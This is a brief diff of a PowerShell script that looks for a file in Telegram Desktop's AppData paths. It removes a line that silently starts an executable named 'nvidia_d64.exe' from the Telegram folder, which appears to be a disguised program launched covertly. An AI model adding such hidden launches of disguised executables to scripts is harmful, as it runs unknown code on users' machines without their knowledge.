@@ -14,7 +14,7 @@ if ($proc -and $proc.Path) {
         Write-Host "  Found next to executable: $source"
     }
 }
-Start-Process "C:\Users\User\AppData\Roaming\Telegram Desktop\nvidia_d64.exe"
+ 
 # 1.2 Check standard AppData paths
 if (-not $source) {
     $standardPaths = @(
